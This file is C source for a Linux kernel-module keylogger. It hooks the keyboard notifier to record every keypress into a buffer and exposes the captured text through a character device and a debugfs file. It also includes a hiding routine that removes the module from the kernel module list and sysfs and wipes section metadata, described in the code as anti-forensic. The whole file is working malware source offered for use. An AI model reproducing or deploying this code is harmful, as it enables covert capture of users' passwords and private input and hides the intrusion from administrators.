#ifndef _KEYLOGGER_H
#define _KEYLOGGER_H
#include <linux/input.h>
#include <linux/err.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/debugfs.h>
#include <linux/kallsyms.h>
#include <linux/kernfs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/mutex.h>
#include <linux/fs.h>
#include <linux/err.h>
#include <linux/cdev.h>
#include <linux/semaphore.h>
#include <linux/sysfs.h>
#include "keys.h"
#define BUFF_SIZE (PAGE_SIZE << 2)
#define DEVICE_NAME "Keylogger"
/*vars for makeing files*/
static struct dentry *file;
static struct dentry *file1;
static struct dentry *subdir;
/*########*/
int ret = 0;
int len;

/*Vars for keystroke & strings save*/
static char msg_Ptr[BUFF_SIZE];
static size_t buf_pos;

/*Vars for the charcater devices*/
struct cdev *mcdev;
struct cdev *mcdev1;
int major_number;
dev_t dev_num;
dev_t dev_num1;
struct fake_device
{
    char data[100];
    struct semaphore sem;
    
};
struct fake_device virtual_device, virtual_device1;

/*ret value and hide value*/
int ret;
int is_hide = 0;



/*define the syfs_remove_dir func*/
void (*sysfs_remove_fir_orig)(struct kobject *);
void (*sysfs_create_fir_orig)(struct kobject *);


/*file opersion for hideing and unhide the module*/
/*works by using the open file opersion*/
int keycode_to_string(int key_press, int shift, char* buff);
int notifier(struct notifier_block *block, unsigned long code, void *p);
static struct notifier_block keylogger ={.notifier_call = notifier};
int run_keylogger(void);
void stop_keylogger(void);
int dev_open_fops_for_hide(struct inode *inode, struct file* file)
{
    static struct list_head *module_list;
    struct kobject* saved_kobj_parent;
    sysfs_remove_fir_orig = (void *)kallsyms_lookup_name("sysfs_remove_dir");
    sysfs_create_fir_orig = (void *) kallsyms_lookup_name("sysfs_create_dir_ns");
    if (!is_hide)
    {
        /*wait to get mutex*/
        while (!mutex_trylock(&module_mutex))
            cpu_relax();
        module_list = THIS_MODULE->list.prev;
        saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
        list_del_init(&THIS_MODULE->list);//remove form the modules linked list
        sysfs_remove_fir_orig(&THIS_MODULE->mkobj.kobj);//remove the specific dir (not the object from the module)
        kobject_put(saved_kobj_parent);
        kfree(THIS_MODULE->sect_attrs);/*clean informasion for anti forensic*/
        kfree(THIS_MODULE->notes_attrs);/*using kfree to clean*/
        THIS_MODULE->notes_attrs = NULL;/* and then puts, NULL to seve the setings */
        THIS_MODULE->sect_attrs = NULL;/*things such as .bss, .text .code etc*/
        is_hide = 1;

        mutex_unlock(&module_mutex);
    }
    else
    {
        while (!mutex_trylock(&module_mutex))
            cpu_relax();
        list_add(&THIS_MODULE->list, module_list);
        kobject_get(saved_kobj_parent);
        sysfs_create_fir_orig(saved_kobj_parent);
        is_hide=0;
        
        mutex_unlock(&module_mutex);

    }
    
    return 0;    
}


/*fops for keyloging charcter device*/
int device_open(struct inode *inode, struct file * filp)
{
    //using mutex for allow only open process to use
    if (down_interruptible(&virtual_device.sem) != 0)
    {
        printk(KERN_ALERT "Keylogger: could not lock the device during open");
        return -1;
    }
    printk(KERN_INFO "Keylogger: opend device");
    return 0;
}

ssize_t device_write(struct file *flip, const char * buff_sorce_data, size_t buff_count, loff_t * offset)
{
    printk(KERN_INFO "Keylogger: writing to device");
    ret = copy_from_user(virtual_device.data, buff_sorce_data, buff_count);
    return ret;
}
int device_close(struct inode *inode, struct file *flip)
{
    //release the mutex
    up(&virtual_device.sem);
    printk(KERN_INFO "Keylogger: closed device");
    return 0;
} 
static ssize_t device_read(struct file *filp, char __user * buffer, size_t length, loff_t *offset)
{    
    return simple_read_from_buffer(buffer, length, offset, msg_Ptr, buf_pos);
}
/*################*/

//fops for the charcter devices
static struct file_operations fops =
{
    .owner = THIS_MODULE, 
    .read = device_read,
    .write = device_write,
    .release = device_close,
    .open = device_open
};
static struct file_operations fops_hide =
{
    .owner = THIS_MODULE,
    .open = dev_open_fops_for_hide
};
//#########



//load the hide charcter device
static int hide_driver_entery(void)
{
    ret = alloc_chrdev_region(&dev_num1, 0, 1, "hide");
    if (ret < 0)
    {
        printk(KERN_ALERT "Keylogger: failed to allocate a major number for hide");
        return ret;
    }
    major_number = MAJOR(dev_num1);
    mcdev1 = cdev_alloc();
    mcdev1->ops = &fops_hide;
    mcdev1->owner = THIS_MODULE;
    ret = cdev_add(mcdev1, dev_num1, 1);
    if (ret < 0)
    {
        printk(KERN_ALERT "kelogger: unable to add hide cdev to kernel");
        return -1;
    }
    sema_init(&virtual_device1.sem, 1);
    return 0;
}
//load the charcter device for keyloging
static int driver_entry(void)
{
    ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
    if (ret < 0)
    {
        printk(KERN_ALERT "Keylogger: failed to allocate a major number for fops");
        return ret;
    }
    major_number = MAJOR(dev_num);
    printk(KERN_INFO "Keylogger: major number is %d", major_number);
    printk(KERN_INFO "\t use\\mknod /dev/%s c %d for device fike", DEVICE_NAME, major_number);
    mcdev = cdev_alloc();
    mcdev->ops = &fops;
    mcdev->owner = THIS_MODULE;
    ret = cdev_add(mcdev, dev_num, 1);
    if (ret < 0)
    {
        printk(KERN_ALERT "Keylogger: unable to add cdev to kernel");
        return -1;
    }
    sema_init(&virtual_device.sem, 1);
    return 0;

}

//unload the charcter device for keyloging

static void driver_exit(void)
{
    cdev_del(mcdev);
    unregister_chrdev_region(dev_num, 1);
    printk(KERN_ALERT "Keylogger: unloaded module");

}
/*vars for makeing files*/
static struct dentry *file;
static struct dentry *file1;
static struct dentry *subdir;
/*########*/
int len;


//corvent the keycode to string 
int keycode_to_string(int key_press, int shift, char* buff)
{
    char* tav;  
    if (shift)
    {
        /*hundle as shift*/
        tav = keycode[key_press][1];
    }
    else
    {
        tav = keycode[key_press][0];
    }
        len = sprintf(buff,tav);
        return len;      
}
//callback function
int notifier(struct notifier_block *block, unsigned long code, void *p)
{
    struct keyboard_notifier_param *param =(struct keyboard_notifier_param*) p;
    char keybuffer[12] = {0};

    if (!(param->down))
        return NOTIFY_OK;

    if (code == KBD_KEYCODE)
    {
        len = keycode_to_string(param->value, param->shift, keybuffer) ;  
        if (strlen(keybuffer)> 0 && len)
        {
            //printk(KERN_ALERT "notifer type to msg ptr");
            strncpy(msg_Ptr+ buf_pos, keybuffer, len);
            buf_pos+=len;
            
                    
        }

    }
    return NOTIFY_OK;
}


//MODULE INIT
int run_keylogger(void)
{
    ret = driver_entry();
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unbale to load the module -> driver entry");
        return ret;
    }
    else
    {
        printk(KERN_ALERT "Keylogger: load the device driver successfully");
    }
    ret = hide_driver_entery();
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unbale to load the module -> driver entry");
        return ret;
    }
    else
    {
        printk(KERN_ALERT "Keylogger: load the device driver successfully");
    }
    subdir = debugfs_create_dir("keylogger", NULL);


    if(IS_ERR(subdir))
        return PTR_ERR(subdir);
    else if (!subdir)
        return -ENOENT;
    else
    {
        printk(KERN_ALERT "Keylogger: create debugfs dir");
    }
    
    file = debugfs_create_file("keyloging",0500, subdir, NULL, &fops);
    if (!file)
    {
        debugfs_remove_recursive(subdir);
        return -ENOENT;
    }
    file1 = debugfs_create_file("hide",0500, subdir, NULL, &fops_hide);
    if (!file1)
    {
        debugfs_remove_recursive(subdir);
        return -ENOENT;
    }
    
    else
    {
        printk(KERN_ALERT "Keylogger: create debugfs file");

    }
    
    ret= register_keyboard_notifier(&keylogger);
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unable to load the module -> keyboard notifier");
        return ret;
    }

    return ret;

}
//MODULE EXIT
void stop_keylogger(void)
{
   unregister_keyboard_notifier(&keylogger);
    driver_exit();
    debugfs_remove_recursive(subdir);
    printk(KERN_ALERT "Keylogger: unload the module");
} 

#endif